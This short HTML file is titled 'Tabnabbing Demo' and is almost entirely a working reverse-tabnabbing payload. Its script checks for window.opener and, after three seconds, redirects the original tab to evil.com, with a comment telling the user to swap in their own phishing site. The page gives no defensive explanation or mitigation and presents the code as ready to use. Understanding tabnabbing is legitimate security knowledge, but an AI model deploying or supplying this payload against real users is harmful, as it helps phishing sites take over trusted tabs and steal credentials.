<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tabnabbing Demo</title>
</head>
<body>
    <h2>Click the link below:</h2>
    <a href="https://example.com" target="_blank">Open in new tab</a>

    <script>
        setTimeout(() => {
            if (window.opener) {
                window.opener.location = "https://evil.com"; // Change to your phishing site
            }
        }, 3000); // Redirect original tab after 3 seconds
    </script>
</body>
</html>
